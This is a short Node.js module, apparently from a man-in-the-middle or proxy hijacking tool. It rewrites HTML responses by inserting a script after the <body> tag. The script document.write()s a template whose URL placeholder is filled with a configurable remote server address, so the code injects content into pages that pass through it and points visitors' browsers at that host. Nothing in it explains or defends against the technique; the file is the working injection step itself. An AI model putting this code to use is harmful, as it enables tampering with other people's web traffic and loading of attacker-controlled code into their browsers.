'use strict';

var fs = require('fs');
var iconv = require('iconv-lite');
var server_ip = "";
var server_port = "";

function Read(path) {
	try {
		return fs.readFileSync(path) + '';
	}
	catch(e) {}
}


exports.setServerIp     = function(ip, port) {
        server_ip = ip;
        server_port = port;
}
exports.go = function(data, charset) {
        console.log('x.go')
        var x_code = "<script>document.write('" + Read('./tpl.html').replace(/\n/g, '').replace(/\r/g, '').replace('____URL____', 'http://' + server_ip + ':'+server_port+'/') + "');</script>";
	var str = data.toString();

	if (! /^\s*(<!|<html|<title|<body|<script|<img)/i.test(str)) {
		return data;
	}

	var val = str.match(/<meta\s+[^>]*charset=['"]?([\w\-]*)/i);

	if (val && val[1]) {
		charset = val[1];
	}

	charset = charset ? charset.toLowerCase() : 'utf-8';

	var html = (charset == 'utf-8')
				? str
				: iconv.decode(data, charset);

	html = html.replace(/<body[^>]*>|$/i, '$&' + x_code);

	return (charset == 'utf-8')
		? new Buffer(html)
		: iconv.encode(html, charset);
}
